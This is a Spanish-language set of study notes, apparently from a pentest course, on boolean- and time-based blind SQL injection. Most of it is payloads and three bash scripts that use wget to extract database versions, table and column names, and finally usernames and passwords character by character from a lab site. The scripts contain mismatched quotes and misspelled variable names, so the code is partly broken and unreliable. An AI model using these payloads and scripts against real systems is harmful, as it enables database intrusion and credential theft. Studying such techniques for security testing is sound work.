Metodología de inferencia para extraer DB schemas y data. Si una aplicación no es explotable por in-band o error-based puede ser aún vulnerable por el Blind.
# Boolean based SQLi

No siginifca que los Blind SQLi son explotable solo si la aplicación no muestra errores, significa que al crear un payload Boolean based SQLi, queremos traformar un query en a True/False condition que refleja su estado al web application output.

' OR 'a'='a

' OR '1'= '1

' OR '1'= '11

Luego de saber qué estatement generan true/false podemos extraer por ejemplo la primera letra del username, si la DB contiene tablas árboles, etc
### Current DB detection

|   |   |
|---|---|
|Mysql>select user();|Retorna el usuario actual que está usando el DB|
|Mysql>select substring('freddy',2,1);|Retorna: r. 'freddy' es input string, 2 es la posición del substring y 1 es su tamaño|
|Mysql>select substring(user(),1,1);|Si el usario es root, retorna r|
|Mysql>select substring(user(), 1, 1)='r';|Si retorna 1 es True, si es 0 False|

Usando estos features, podemos iterar sobre las netras del username usando:

|                                |                                                                                 |
| ------------------------------ | ------------------------------------------------------------------------------- |
| `' or substr(user(), 1, 1)='a` | Buscamos la primera letra del usuario actual de la de DB infiriendo si es 1 o 0 |
| `' or substr(user(), 2, 1)='a` | Buscamos la primera letra del usuario actual de la de DB infiriendo si es 1 o 0 |

Ejemplo de inyección:, tendriamos  que probar cada uno de los posibles caracteres <a,z>, <A,Z>,<0,9> hasta obtener el nombre del usuario por ejemplo

99999 or SUBSTRING(user_name(),1,1) = 'c'; -- -

Para acelerar el proceso, odemos descartar si un carácter es mayúscula y minúscula para evitar probrar con todas las letras en ambos casos

|   |   |
|---|---|
|`ASCII(UPPER(SUBSTRING(My_query),<position>,q)))=ASCII(SUBSTRING((My_query),<position>,1))`|Si sale False, entonces el valor está en minúscula|

Para lo contrario probamos con la función LOWER(). Si ambos resultados son TRUE entonces nuestro carácter es un número o un símbolo (al hacerlos UPPER o LOWER no cambian)

# Time Based Blind SQL Injection

Usada para inferir a TRUE condition de un FALSE condition

![This SQL syntax is used: 
SSQL condi t ions wai t for delay](file:///C:/Users/fredd/AppData/Local/Temp/msohtmlclip1/02/clip_image001.png)

Si la condición es TRUE, el DBMS demorar 6 segundos

Ejemplos:

|   |   |
|---|---|
|If (select user) = 'sa' wait for delay '0:0:5'|Ver si somos sa en MS SQL|
|IF EXISTS (SELECT * FROM users WHERE username = 'armando') BENCHMARK (1000000,MD5(1))|Inferir un DB value en MySQL. Benchmark hara la función MD5(1) 100000 veces si el IF clause produce TRUE (consumiendo tiempo)|

Tener cuidado con BENCHMARK, esto puede impactar en la carga del servidor

# Casos de ejemplo

Vemos el comportamiento de la página con un caso TRUE/FALSE

|   |   |
|---|---|
|Band=Hello' and  'a'='a|Caso True|
|Band=Hello' and  'a'='b|Caso False|

Ahora para extraer la versión, probamos con substrings

|   |   |
|---|---|
|Band=Hello' rbstring(@@version,1,1)='5|Probamos desde el valor 0 hasta un valor que muestra algún output diferente según el TRUE o FALSE|

Podemos automatizar esta tarea con el siguiente script. Usamos \ para los símbolos especiales para que el shell los interprete como símbolos del código. Tambien declaramos la true condition en este caso.

>nano blind1.sh

#!/bin/bash

charset='echo {0..9} {A..Z} \. \: \, \; \- \_ \@'

export URL="http://blind.sql.site/banddetails.php"

export  trustring='We worked with them in the past."

for i in $charset

do

wget "$URL?band=the offspring' and substring(@@version,1,1)='$i' -q -O - | grep "$truestring' &> /dev/null

if [ "$?" == "0" ]
then
echo Character found: $i
Break
fi
done

|   |   |
|---|---|
|>bash blind1.sh|Ejecutamos el script|
|>nano blind1.sh|Editamos para extaer el segundo character en la linea de script|

wget "$URL?band=the offspring' and substring(@@version,2,1)='$i' -q -O - | grep "$truestring'

Ejecutmos nuevamente con >bash

### Máximo tamaño del string que queremos extraer

>nano blind2.sh

#!/bin/bash
charset='echo {0..9} {A..Z} \. \: \, \; \- \_ \@'
export URL="http://blind.sql.site/banddetails.php"
export  trustring='We worked with them in the past."
export maxlengh=$1
export result=""
for ((j=1; j<$maxlenght;j+=1))
do
export nthchart=$j
for i in $charset
do
wget "$URL?band=the offspring' and substring(@@version,$nthchar,1)='$i" -q -O - | grep "$truestring' &> /dev/null
if [ "$?" == "0" ]
then
echo Character number $nthchar found: $i
export result+=$i
break
fi
done
done
echo Result: $result

|   |   |
|---|---|
|>bash blind2.sh 20|Usa como parámetro 20 que entra en el algoritmo como $1|

|   |   |
|---|---|
|$?|Simboliza el estatus de salida del último comando ejecutado (en este caso cuando se ejecuta wget): es 0 cuando es TRUE  y 1 en TRUE|

|   |   |
|---|---|
|>nano blind3.sh|Version mejorada de blind2 donde usamos como parámetro un query|

#!/bin/bash
charset='echo {0..9} {A..Z} \. \: \, \; \- \_ \@'
export URL="http://blind.sql.site/banddetails.php"
export  trustring='We worked with them in the past."
export maxlengh=$1
export query=$2
export result=""
echo "Extracting the results for $query…"
for ((j=1; j<$maxlenght;j+=1))
do

export nthchart=$j

for i in $charset
do
wget "$URL?band=the offspring' and substring(($query),$nthchar,1)='$i" -q -O - | grep "$truestring' &> /dev/null
if [ "$?" == "0" ]
then
echo Character number $nthchar found: $i
export result+=$i
break
fi
done
done
ccho Result: $result

|   |   |
|---|---|
|>bash blind3.sh 20 "Select user()"|Entre comillas el segundo parámetro para que el shell no tome en cuenta como una función aparte el user()|
|>bash blind3.sh 20 "Select database()"|Extracción de DB name|
|>bash blind3.sh 20 "SELECT table_name FROM information_schema.tables WHERE table_schema='motville' limit 0,1 "|Extracción de la primera tabla de "motville".|

Referencia: [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

|   |   |
|---|---|
|>bash blind3.sh 20 "SELECT table_name FROM information_schema.tables WHERE table_schema='motville' limit 1,1 "|Extraemos la siguiente tabla y así sucesivamente con 2,3<br><br>OUTPUT:'accounts"|
|>bash blind3.sh 20 "SELECT column_name FROM information_schema.columns WHERE table_name='accounts' limit 0,1 "|Extraemos el nombre de la primera columna<br><br>OUTPUT: username|
|>bash blind3.sh 20 "SELECT column_name FROM information_schema.columns WHERE table_name='accounts' limit 1,1 "|Así sucesivamente con 2,3,4|
|>bash blind3.sh 20 "SELECT concat(username, '---', password) from accounts limit 0,1"|Extraemos username y password de la tabla accounts<br><br>OUTPUT: admin---432rifw|